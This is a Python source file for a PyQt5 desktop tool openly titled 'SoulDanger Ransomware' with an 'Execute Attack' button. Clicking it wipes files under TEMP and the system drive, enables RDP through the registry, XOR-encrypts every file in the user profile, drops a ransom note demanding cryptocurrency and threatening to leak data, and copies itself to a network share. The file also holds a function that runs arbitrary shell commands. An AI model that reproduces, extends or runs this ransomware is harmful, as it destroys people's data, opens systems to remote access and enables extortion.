import sys
from PyQt5.QtWidgets import QApplication, QMainWindow, QWidget, QPushButton, QVBoxLayout, QLabel, QMessageBox
from PyQt5.QtGui import QIcon
import subprocess
import os
import shutil
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import socket
import winreg
import base64
import random
import string

# Function to generate a random AES key
def generate_aes_key():
    key = os.urandom(32)  # AES-256 key length
    with open('key.txt', 'wb') as key_file:
        key_file.write(key)
    return key

# Load the AES key from file
def load_aes_key():
    return open('key.txt', 'rb').read()

# Generate or load AES key
aes_key = generate_aes_key()
cipher = Cipher(algorithms.AES(aes_key), modes.CFB(os.urandom(16)), backend=default_backend())

# Function to get system information
def get_system_info():
    info = {
        'hostname': socket.gethostname(),
        'ip_address': socket.gethostbyname(socket.gethostname()),
        'user': os.getlogin(),
        'os': os.name
    }
    return info

# XOR encryption/decryption function
def xor_encrypt_decrypt(data, xor_key=0xAA):
    return bytearray(b ^ xor_key for b in data)

# Function to delete files
def delete_files():
    try:
        for root_dir in [os.getenv('TEMP'), os.getenv('SYSTEMDRIVE')]:
            for foldername, subfolders, filenames in os.walk(root_dir):
                for filename in filenames:
                    file_path = os.path.join(foldername, filename)
                    os.remove(file_path)
        return "All files deleted successfully."
    except Exception as e:
        return f"Error deleting files: {e}"

# Function to execute a command
def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return f"Command '{command}' executed. Output: {result.stdout}"
    except Exception as e:
        return f"Error executing command: {e}"

# Function to enable RDP
def enable_rdp():
    try:
        reg_path = r"SYSTEM\CurrentControlSet\Control\Terminal Server"
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        return "RDP enabled."
    except Exception as e:
        return f"Error enabling RDP: {e}"

# Function to create and save ransom note
def send_ransom_note():
    try:
        ransom_note = """
########################### URGENT ###########################
########################## SOULDANGER ##########################

**ATTENTION: YOUR SYSTEM IS UNDER ATTACK!**

You are now the target of a sophisticated ransomware attack by the notorious group "SoulDanger". All files on your system have been meticulously encrypted using the most advanced cryptographic techniques.

Your data is locked, and without our decryption key, it is permanently lost. Our encryption methods are designed to withstand even the most advanced recovery attempts.

**WHAT YOU NEED TO DO TO RECOVER YOUR FILES:**

1. **PAY THE RANSOM**: Follow the instructions below to transfer a specified amount in cryptocurrency to our secure wallet. The exact amount and payment instructions will be provided upon contact.

2. **CONTACT US IMMEDIATELY**: Once payment is made, contact us via Telegram using the provided details. We will guide you through the decryption process and provide you with the key to restore your files.

**IMPORTANT:**

- **DO NOT ATTEMPT TO REPAIR OR RECOVER YOUR FILES YOURSELF**: Any attempt to modify or manipulate the encrypted files will result in permanent data loss.

- **IGNORE THIS MESSAGE AT YOUR OWN RISK**: Failure to pay will not only result in the permanent loss of your files but may also lead to continued and escalating attacks on your system.

- **PUBLIC EXPOSURE**: We have the capability to make your sensitive data public if necessary. This is not a threat but a reality if you do not act quickly.

**PLEASE NOTE:**

Your heart will beat faster, breathe deeply. If you attempt to restart your computer, consider your files lost forever.

**CONTACT DETAILS:**

- **Contact Telegram**: [Your Telegram Username or Contact Details]

**YOUR PERSONAL DECRYPTION ID: [UNIQUE_ID_HERE]**

Time is of the essence. The longer you delay, the more likely you are to lose your files permanently.

We are not interested in causing drama or panic, but we are very serious about the consequences of non-payment. Our reputation depends on our ability to keep our promises, and we will if you comply.

**ACT NOW TO AVOID PERMANENT DATA LOSS.**

############################ END OF MESSAGE ##########################
"""
        with open('README.txt', 'w') as ransom_file:
            ransom_file.write(ransom_note)
        return "Ransom note created."
    except Exception as e:
        return f"Error creating ransom note: {e}"

# Function to encrypt files
def encrypt_files():
    try:
        for root_dir in [os.getenv('USERPROFILE')]:
            for foldername, subfolders, filenames in os.walk(root_dir):
                for filename in filenames:
                    file_path = os.path.join(foldername, filename)
                    with open(file_path, 'rb') as file:
                        data = file.read()
                    encrypted_data = xor_encrypt_decrypt(data)
                    with open(file_path, 'wb') as file:
                        file.write(encrypted_data)
        return "Files encrypted successfully."
    except Exception as e:
        return f"Error encrypting files: {e}"

# Function to propagate (self-replication)
def propagate():
    try:
        network_shares = ["\\\\NetworkShare\\path\\to\\destination"]
        for share in network_shares:
            shutil.copy("Souldanger.exe", share)
        return "Propagation completed."
    except Exception as e:
        return f"Error propagating: {e}"

# Main function to execute all features
def main_action():
    system_info = get_system_info()
    results = []
    results.append(delete_files())
    results.append(enable_rdp())
    results.append(encrypt_files())
    results.append(send_ransom_note())
    results.append(propagate())
    
    result_message = "\n".join(results)
    QMessageBox.information(window, "Results", result_message)

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()

        self.setWindowTitle("SoulDanger Ransomware")
        self.setGeometry(100, 100, 400, 300)
        self.setWindowIcon(QIcon('icon.png'))  # Ensure 'icon.png' is in your directory

        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)

        self.layout = QVBoxLayout()
        self.central_widget.setLayout(self.layout)

        self.label = QLabel("Welcome to SoulDanger Ransomware", self)
        self.layout.addWidget(self.label)

        self.button = QPushButton("Execute Attack", self)
        self.button.clicked.connect(main_action)
        self.layout.addWidget(self.button)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())
